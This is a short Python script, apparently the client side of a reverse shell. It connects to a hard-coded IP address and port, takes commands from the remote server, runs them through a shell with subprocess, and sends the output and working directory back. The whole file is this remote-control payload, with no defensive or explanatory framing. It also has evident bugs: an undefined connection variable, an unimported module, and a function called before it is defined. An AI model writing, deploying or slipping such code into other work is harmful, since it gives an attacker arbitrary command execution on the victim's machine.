import socket
import os
import subprocess
from sys import stderr, stdin, stdout #windows process : threading 


s = socket.socket()
host = "192.168.29.163" #Server IP address
port = 1234

s.connect((host, port))

while True:
     data = s.recv(1024).decode("utf-8").strip()

     if data=="quit" or data=="q":
         close_con()
     elif data[:2] == "cd":
         os.chdir(data[3:])
     

     if len(data) > 0:
        cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        current_directory = os.getcwd() + "> "
        s.send(str.encode(output_str + current_directory))

def close_con():
        conn.close()
        s.close()
        sys.exit()